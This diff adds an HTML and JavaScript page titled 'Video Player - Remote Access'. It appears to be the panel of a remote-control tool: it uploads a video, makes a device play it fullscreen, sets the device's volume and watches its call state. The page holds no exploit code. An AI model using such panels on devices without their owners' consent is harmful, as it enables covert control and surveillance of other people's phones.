@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player - Remote Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #0a0e17;
+            color: #d0d0d0;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        .app-layout {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .top-bar h1 {
+            font-size: 16px;
+            color: #ff6b35;
+            margin: 0;
+        }
+
+        .back-btn {
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+            padding: 6px 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+        }
+
+        .back-btn:hover {
+            color: #ff6b35;
+            border-color: rgba(255, 107, 53, 0.3);
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 107, 53, 0.12);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .card label {
+            display: block;
+            font-size: 11px;
+            color: #ff6b35;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        /* ===== FILE DROP ZONE ===== */
+        .file-drop-zone {
+            border: 2px dashed rgba(255, 107, 53, 0.2);
+            border-radius: 10px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+
+        .file-drop-zone:hover {
+            border-color: rgba(255, 107, 53, 0.4);
+            background: rgba(255, 107, 53, 0.04);
+        }
+
+        .file-drop-zone.dragover {
+            border-color: #ff6b35;
+            background: rgba(255, 107, 53, 0.08);
+        }
+
+        .file-drop-zone .icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .file-drop-zone div {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .file-drop-zone .hint {
+            font-size: 10px;
+            color: #555;
+            margin-top: 4px;
+        }
+
+        /* ===== FILE INFO ===== */
+        .file-info {
+            display: none;
+            background: rgba(255, 107, 53, 0.06);
+            border: 1px solid rgba(255, 107, 53, 0.15);
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin-bottom: 12px;
+        }
+
+        .file-info .name {
+            font-size: 12px;
+            color: #ff6b35;
+            margin-bottom: 2px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .file-info .meta {
+            font-size: 10px;
+            color: #888;
+        }
+
+        /* ===== PROGRESS BAR ===== */
+        .progress-container {
+            margin: 12px 0;
+        }
+
+        .progress-bar-track {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 3px;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff6b35, #ff3c78);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .progress-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            color: #555;
+            margin-top: 4px;
+        }
+
+        /* ===== CONTROLS ===== */
+        .controls {
+            display: flex;
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .ctrl-btn {
+            flex: 1;
+            padding: 14px;
+            border: 2px solid rgba(255, 107, 53, 0.2);
+            border-radius: 10px;
+            background: rgba(255, 107, 53, 0.06);
+            color: #ff6b35;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .ctrl-btn:hover:not(:disabled) {
+            background: rgba(255, 107, 53, 0.12);
+            border-color: rgba(255, 107, 53, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .ctrl-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .ctrl-btn.stop-btn {
+            border-color: rgba(255, 60, 60, 0.25);
+            color: #ff4444;
+            background: rgba(255, 60, 60, 0.06);
+        }
+
+        .ctrl-btn.stop-btn:hover:not(:disabled) {
+            background: rgba(255, 60, 60, 0.12);
+            border-color: rgba(255, 60, 60, 0.4);
+        }
+
+        .ctrl-btn.active {
+            background: rgba(255, 107, 53, 0.15);
+            border-color: #ff6b35;
+            box-shadow: 0 0 12px rgba(255, 107, 53, 0.15);
+        }
+
+        /* ===== SLIDER ===== */
+        .slider-group {
+            margin-bottom: 12px;
+        }
+
+        .slider-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .slider-val {
+            color: #ff6b35;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            accent-color: #ff6b35;
+            height: 4px;
+        }
+
+        /* ===== TOGGLE ===== */
+        .toggle-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+        }
+
+        .toggle-row span {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 40px;
+            height: 22px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 11px;
+            transition: 0.3s;
+        }
+
+        .toggle-slider:before {
+            content: "";
+            position: absolute;
+            height: 16px;
+            width: 16px;
+            left: 3px;
+            bottom: 3px;
+            background: #666;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        .toggle-switch input:checked+.toggle-slider {
+            background: rgba(255, 107, 53, 0.3);
+        }
+
+        .toggle-switch input:checked+.toggle-slider:before {
+            transform: translateX(18px);
+            background: #ff6b35;
+        }
+
+        /* ===== STATUS ===== */
+        .status-display {
+            text-align: center;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.01);
+        }
+
+        .status-state {
+            font-size: 14px;
+            color: #ff6b35;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-message {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .status-state.playing {
+            color: #00ff41;
+            animation: pulse 2s infinite;
+        }
+
+        .status-state.downloading {
+            color: #00c8ff;
+        }
+
+        .status-state.paused {
+            color: #ffaa00;
+        }
+
+        .status-state.error {
+            color: #ff4444;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        /* ===== UPLOAD PROGRESS ===== */
+        .upload-progress {
+            display: none;
+            margin: 12px 0;
+        }
+
+        .upload-bar-track {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .upload-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00c8ff, #00ff41);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.2s;
+        }
+
+        .upload-label {
+            font-size: 10px;
+            color: #00c8ff;
+            text-align: center;
+            margin-top: 4px;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: rgba(255, 107, 53, 0.9);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-family: inherit;
+            transition: transform 0.3s ease;
+            z-index: 9999;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.error {
+            background: rgba(255, 60, 60, 0.9);
+        }
+
+        @media (max-width: 480px) {
+            .app-layout {
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-layout">
+        <!-- Header -->
+        <div class="top-bar">
+            <h1>&#x1F3AC; VIDEO PLAYER</h1>
+            <a href="index.html" class="back-btn">&#x2190; Dashboard</a>
+        </div>
+
+        <!-- File Selection -->
+        <div class="card">
+            <label>&#x1F4C1; Select Video File</label>
+            <div class="file-drop-zone" id="file-drop-zone"
+                onclick="document.getElementById('video-file-input').click()">
+                <div class="icon">&#x1F3AC;</div>
+                <div>Click to select video file</div>
+                <div class="hint">MP4, MKV, AVI, WebM, MOV, 3GP, FLV — any format</div>
+            </div>
+            <input type="file" id="video-file-input" accept="video/*,audio/*,.mkv,.avi,.flv,.3gp,.mov"
+                style="display:none">
+            <div class="file-info" id="file-info">
+                <div class="name" id="file-name"></div>
+                <div class="meta" id="file-meta"></div>
+            </div>
+
+            <!-- Upload Progress -->
+            <div class="upload-progress" id="upload-progress">
+                <div class="upload-bar-track">
+                    <div class="upload-bar-fill" id="upload-bar-fill"></div>
+                </div>
+                <div class="upload-label" id="upload-label">Uploading...</div>
+            </div>
+        </div>
+
+        <!-- Controls -->
+        <div class="card">
+            <label>&#x1F3AE; Controls</label>
+            <div class="controls">
+                <button class="ctrl-btn" id="btn-play" disabled onclick="playVideo()">&#x25B6; PLAY</button>
+                <button class="ctrl-btn" id="btn-pause" disabled onclick="pauseVideo()">&#x23F8; PAUSE</button>
+                <button class="ctrl-btn stop-btn" id="btn-stop" disabled onclick="stopVideo()">&#x25A0; STOP</button>
+            </div>
+            <div class="controls">
+                <button class="ctrl-btn" id="btn-fullscreen" disabled onclick="toggleFullscreen()">&#x26F6;
+                    FULLSCREEN</button>
+            </div>
+        </div>
+
+        <!-- Playback Progress -->
+        <div class="card">
+            <label>&#x1F4CA; Playback</label>
+            <div class="progress-container">
+                <div class="progress-bar-track" id="progress-track">
+                    <div class="progress-bar-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-labels">
+                    <span id="progress-current">0:00</span>
+                    <span id="progress-total">0:00</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Settings -->
+        <div class="card">
+            <label>&#x2699; Settings</label>
+            <div class="slider-group">
+                <div class="slider-label">
+                    <span>Volume</span>
+                    <span class="slider-val" id="vol-val">100%</span>
+                </div>
+                <input type="range" id="volume" min="0" max="100" value="100"
+                    oninput="document.getElementById('vol-val').textContent = this.value + '%'">
+            </div>
+            <div class="toggle-row">
+                <span>&#x1F501; Loop Playback</span>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="loop-toggle">
+                    <span class="toggle-slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <!-- Status -->
+        <div class="status-display" id="status-display">
+            <div class="status-state" id="status-state">IDLE</div>
+            <div class="status-message" id="status-message">Select a video file to get started</div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        // ========== STATE ==========
+        let selectedFile = null;
+        let uploadedTempFilename = null;
+        let uploadedOriginalName = null;
+        let isPlaying = false;
+        let isPaused = false;
+        let isFullscreen = true;
+        let wsConnection = null;
+
+        // ========== DOM REFS ==========
+        const fileDropZone = document.getElementById('file-drop-zone');
+        const fileInput = document.getElementById('video-file-input');
+        const fileInfo = document.getElementById('file-info');
+        const btnPlay = document.getElementById('btn-play');
+        const btnPause = document.getElementById('btn-pause');
+        const btnStop = document.getElementById('btn-stop');
+        const progressFill = document.getElementById('progress-fill');
+        const progressCurrent = document.getElementById('progress-current');
+        const progressTotal = document.getElementById('progress-total');
+        const uploadProgress = document.getElementById('upload-progress');
+        const uploadBarFill = document.getElementById('upload-bar-fill');
+        const uploadLabel = document.getElementById('upload-label');
+        const statusState = document.getElementById('status-state');
+        const statusMessage = document.getElementById('status-message');
+
+        // ========== FILE SELECTION ==========
+        fileDropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            fileDropZone.classList.add('dragover');
+        });
+        fileDropZone.addEventListener('dragleave', () => fileDropZone.classList.remove('dragover'));
+        fileDropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            fileDropZone.classList.remove('dragover');
+            const file = e.dataTransfer?.files?.[0];
+            if (file) loadFile(file);
+            else showToast('Please drop a video file', true);
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files?.[0];
+            if (file) loadFile(file);
+        });
+
+        function loadFile(file) {
+            selectedFile = file;
+            uploadedTempFilename = null; // Reset — needs re-upload
+
+            const sizeMB = (file.size / 1024 / 1024).toFixed(1);
+            document.getElementById('file-name').textContent = file.name;
+            document.getElementById('file-meta').textContent = `${sizeMB} MB • ${file.type || 'video'}`;
+            fileInfo.style.display = 'block';
+            fileDropZone.innerHTML = '<div class="icon">&#x2705;</div><div>File loaded — click to change</div>';
+
+            btnPlay.disabled = false;
+            updateStatus('ready', `Ready: ${escHtml(file.name)}`);
+        }
+
+        // ========== UPLOAD ==========
+        async function uploadFile() {
+            if (!selectedFile) throw new Error('No file selected');
+
+            // If already uploaded, reuse
+            if (uploadedTempFilename) return;
+
+            uploadProgress.style.display = 'block';
+            uploadBarFill.style.width = '0%';
+            uploadLabel.textContent = 'Uploading...';
+
+            return new Promise((resolve, reject) => {
+                const formData = new FormData();
+                formData.append('file', selectedFile);
+
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `${window.location.origin}/api/device-upload-temp`);
+                xhr.withCredentials = true;
+
+                xhr.upload.onprogress = (e) => {
+                    if (e.lengthComputable) {
+                        const pct = Math.round((e.loaded / e.total) * 100);
+                        uploadBarFill.style.width = pct + '%';
+                        uploadLabel.textContent = `Uploading: ${pct}%`;
+                    }
+                };
+
+                xhr.onload = () => {
+                    if (xhr.status === 200) {
+                        const data = JSON.parse(xhr.responseText);
+                        uploadedTempFilename = data.tempFilename;
+                        uploadedOriginalName = data.originalName;
+                        uploadProgress.style.display = 'none';
+                        resolve();
+                    } else {
+                        uploadProgress.style.display = 'none';
+                        reject(new Error(`Upload failed: HTTP ${xhr.status}`));
+                    }
+                };
+
+                xhr.onerror = () => {
+                    uploadProgress.style.display = 'none';
+                    reject(new Error('Upload failed: network error'));
+                };
+
+                xhr.send(formData);
+            });
+        }
+
+        // ========== PLAY / PAUSE / STOP ==========
+        async function playVideo() {
+            if (isPaused) {
+                // Resume
+                try {
+                    await api.sendCommand(deviceId, 'video_resume');
+                    isPaused = false;
+                    isPlaying = true;
+                    updateButtons();
+                } catch (e) {
+                    showToast('Resume error: ' + e.message, true);
+                }
+                return;
+            }
+
+            try {
+                btnPlay.disabled = true;
+                updateStatus('uploading', 'Uploading to server...');
+
+                // Upload file first
+                await uploadFile();
+
+                updateStatus('sending', 'Sending to device...');
+
+                // Send play command
+                const volume = parseInt(document.getElementById('volume').value) / 100;
+                const loop = document.getElementById('loop-toggle').checked;
+
+                await api.sendCommand(deviceId, 'video_play', {
+                    tempFilename: uploadedTempFilename,
+                    originalName: uploadedOriginalName,
+                    volume,
+                    loop
+                });
+
+                isPlaying = true;
+                isPaused = false;
+                updateButtons();
+
+            } catch (e) {
+                showToast('Play error: ' + e.message, true);
+                updateStatus('error', 'Error: ' + e.message);
+                btnPlay.disabled = false;
+            }
+        }
+
+        async function pauseVideo() {
+            try {
+                await api.sendCommand(deviceId, 'video_pause');
+                isPaused = true;
+                updateButtons();
+            } catch (e) {
+                showToast('Pause error: ' + e.message, true);
+            }
+        }
+
+        async function stopVideo() {
+            try {
+                await api.sendCommand(deviceId, 'video_stop');
+                isPlaying = false;
+                isPaused = false;
+                isFullscreen = true;
+                progressFill.style.width = '0%';
+                progressCurrent.textContent = '0:00';
+                updateButtons();
+                updateStatus('stopped', 'Stopped');
+            } catch (e) {
+                showToast('Stop error: ' + e.message, true);
+            }
+        }
+
+        async function toggleFullscreen() {
+            try {
+                const newMode = !isFullscreen;
+                await api.sendCommand(deviceId, 'video_fullscreen', { fullscreen: newMode });
+                isFullscreen = newMode;
+                updateButtons();
+            } catch (e) {
+                showToast('Fullscreen error: ' + e.message, true);
+            }
+        }
+
+        // ========== UI HELPERS ==========
+        function updateButtons() {
+            btnPlay.disabled = !selectedFile || (isPlaying && !isPaused);
+            btnPlay.textContent = isPaused ? '▶ RESUME' : '▶ PLAY';
+            btnPause.disabled = !isPlaying || isPaused;
+            btnStop.disabled = !isPlaying && !isPaused;
+            const btnFs = document.getElementById('btn-fullscreen');
+            btnFs.disabled = !isPlaying && !isPaused;
+            btnFs.textContent = isFullscreen ? '⛶ WINDOW' : '⛶ FULLSCREEN';
+        }
+
+        function updateStatus(state, message) {
+            statusState.textContent = state.toUpperCase();
+            statusState.className = 'status-state ' + state;
+            if (message) statusMessage.textContent = message;
+        }
+
+        function formatTime(ms) {
+            const totalSec = Math.floor(ms / 1000);
+            const min = Math.floor(totalSec / 60);
+            const sec = totalSec % 60;
+            return `${min}:${String(sec).padStart(2, '0')}`;
+        }
+
+        function showToast(msg, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.className = 'toast show' + (isError ? ' error' : '');
+            setTimeout(() => { toast.className = 'toast'; }, 3000);
+        }
+
+        // ========== WEBSOCKET — RECEIVE STATUS EVENTS ==========
+        function connectWS() {
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            wsConnection = new WebSocket(`${wsProtocol}//${location.host}`);
+
+            wsConnection.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+
+                    // Video status from device
+                    if (data.type === 'video_status' && data.deviceId === deviceId) {
+                        handleVideoStatus(data);
+                    }
+
+                    // Incoming call notification
+                    if (data.type === 'call_state' && typeof handleCallState === 'function') {
+                        handleCallState(data);
+                    }
+                } catch (e) { }
+            };
+
+            wsConnection.onclose = () => {
+                setTimeout(connectWS, 3000);
+            };
+
+            wsConnection.onerror = () => { };
+        }
+
+        function handleVideoStatus(data) {
+            const { state, position, duration, progress, message } = data;
+
+            // Update status display
+            if (state) updateStatus(state, message || state);
+
+            // Update progress bar
+            if (position !== undefined && duration !== undefined && duration > 0) {
+                const pct = (position / duration * 100).toFixed(1);
+                progressFill.style.width = pct + '%';
+                progressCurrent.textContent = formatTime(position);
+                progressTotal.textContent = formatTime(duration);
+            }
+
+            // Download progress
+            if (state === 'downloading' && progress !== undefined) {
+                progressFill.style.width = progress + '%';
+                progressCurrent.textContent = progress + '%';
+                progressTotal.textContent = '100%';
+            }
+
+            // Update play/pause/stop state
+            if (state === 'playing') {
+                isPlaying = true;
+                isPaused = false;
+                updateButtons();
+            } else if (state === 'paused') {
+                isPlaying = true;
+                isPaused = true;
+                updateButtons();
+            } else if (state === 'stopped' || state === 'completed' || state === 'error') {
+                isPlaying = false;
+                isPaused = false;
+                updateButtons();
+                if (state === 'completed') {
+                    progressFill.style.width = '100%';
+                }
+            }
+        }
+
+        // ========== INIT ==========
+        connectWS();
+
+        // Volume change — controls actual device volume + MediaPlayer level
+        let volDebounce = null;
+        document.getElementById('volume').addEventListener('input', function () {
+            const level = parseInt(this.value);
+            clearTimeout(volDebounce);
+            volDebounce = setTimeout(async () => {
+                try {
+                    // Set actual device media stream volume
+                    await api.sendCommand(deviceId, 'set_device_volume', { level, stream: 'music' });
+                    // Also set MediaPlayer volume if video is playing
+                    if (isPlaying) {
+                        await api.sendCommand(deviceId, 'video_volume', { volume: level / 100 });
+                    }
+                } catch (e) { }
+            }, 150);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (isPlaying) {
+                // Fire-and-forget stop
+                try {
+                    api.sendCommand(deviceId, 'video_stop').catch(() => { });
+                } catch (e) { }
+            }
+            if (wsConnection) wsConnection.close();
+        });
+    </script>
+</body>
+
+</html>
